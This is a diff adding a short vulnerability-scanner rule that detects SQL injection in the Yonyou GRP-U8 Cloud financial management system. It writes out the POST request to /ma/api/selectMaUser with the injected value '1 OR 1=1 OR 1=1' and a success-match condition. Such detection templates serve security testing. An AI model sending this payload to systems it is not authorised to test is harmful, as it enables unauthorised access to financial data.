@@ -1,0 +1,14 @@
+name: yonyou-grpu8-cloud-sqli
+rules:
+  - method: POST
+    path: "/ma/api/selectMaUser"
+    headers:
+      Content-Type: application/json
+    body: '{"orgCode":"1 OR 1=1 OR 1=1"}'
+    expression: |
+      response.status == 200 && response.body.bcontains(b"\"success\"")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "用友GRP-U8 Cloud 财务管理系统SQL注入漏洞"
